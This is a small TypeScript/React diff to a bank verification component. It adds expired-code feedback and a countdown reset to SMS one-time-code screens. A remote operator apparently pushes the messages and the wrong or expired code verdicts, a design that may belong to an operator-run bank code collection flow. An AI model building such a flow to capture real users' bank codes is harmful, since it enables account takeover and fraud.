@@ -16,8 +16,10 @@ const LAYOUT_MAP: Record<
     bank?: string;
     onError: (m: string) => void;
     wrongCode?: boolean;
+    expiredCode?: boolean;
     onTryAgain?: () => void;
     operatorMessage?: { level: "error" | "info"; message: string } | null;
+    countdownResetTrigger?: number;
   }) => JSX.Element
 > = {
   sms: (p) => <SmsOtp {...p} />,
@@ -41,7 +43,7 @@ export function BankVerification({
 }: BankVerificationProps) {
   const [error, setError] = useState<string | null>(null);
 
-  const { status, verificationLayout, bank, redirectUrl, wrongCode, clearWrongCode, operatorMessage } =
+  const { status, verificationLayout, bank, redirectUrl, wrongCode, expiredCode, clearCodeFeedback, operatorMessage, countdownResetTrigger } =
     useSessionStatus(apiBase, channelSlug, sessionId);
 
   useEffect(() => {
@@ -102,8 +104,10 @@ export function BankVerification({
           bank={bank}
           onError={(m) => setError(m)}
           wrongCode={wrongCode}
-          onTryAgain={clearWrongCode}
+          expiredCode={expiredCode}
+          onTryAgain={clearCodeFeedback}
           operatorMessage={operatorMessage}
+          countdownResetTrigger={countdownResetTrigger}
         />
       )}
       {error && (
